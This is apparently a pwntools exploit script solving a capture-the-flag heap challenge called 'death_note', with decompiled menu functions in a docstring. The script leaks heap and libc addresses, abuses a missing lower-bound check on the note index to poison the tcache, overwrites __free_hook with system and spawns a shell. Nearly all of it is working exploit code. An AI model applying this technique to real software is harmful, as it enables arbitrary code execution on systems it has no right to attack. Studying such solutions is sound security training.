# encoding=utf-8
from pwn import *


"""
void *sub_9AA()
{
  void *result; // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  result = malloc(0x50uLL);
  heap_list = (__int64)result;
  return result;
}


ssize_t edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  write(1, "Provide note index: ", 0x14uLL);
  v1 = read_int();
  if ( v1 > 9 )
    return write(1, "The death note isn't that big unfortunately\n", 0x2CuLL);
  if ( !*(_QWORD *)(8LL * v1 + heap_list) )
    return write(1, "Page doesn't even exist!\n", 0x19uLL);
  write(1, "Name: ", 6uLL);
  return read(0, *(void **)(8LL * v1 + heap_list), (unsigned int)heap_size[v1]);
}
"""


file_path = "./death_note"
elf = ELF(file_path)
p = process("./death_note", env={'LD_PRELOAD':"./libc.so.6"})
libc = ELF('./libc.so.6')


def add(size):
    p.sendlineafter("5- Exit\n", "1")
    p.sendlineafter("note size:", str(size))


def edit(index, content):
    p.sendlineafter("5- Exit\n", "2")
    p.sendlineafter("note index: ", str(index))
    p.sendafter("Name: ", content)


def delete(index):
    p.sendlineafter("5- Exit\n", "3")
    p.sendlineafter("note index: ", str(index))


def show(index):
    p.sendlineafter("5- Exit\n", "4")
    p.sendlineafter("note index: ", str(index))


for i in range(9):
	add(0x88)

delete(0)
delete(1)

add(0x88)
add(0x88)

show(0)
heap = u64(p.recv(6).ljust(8, b"\x00")) - 0x2c0
log.info(f"HEAP Base:   {hex(heap)}")

for i in range(8):
	delete(i)

for i in range(8):
	add(0x88)

edit(7, "aaaaaaaa")
show(7)
p.recv(8)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
log.info(f"libc.address Base:   {hex(libc.address)}")

for i in range(9):
	delete(i)

for i in range(3):
	add(0xff)

delete(0)
delete(1)

pause()
edit(-0x33, p64(libc.sym['__free_hook']))

add(0xff)
add(0xff)
edit(0, "/bin/sh\x00")
edit(1, p64(libc.sym['system']))
p.interactive()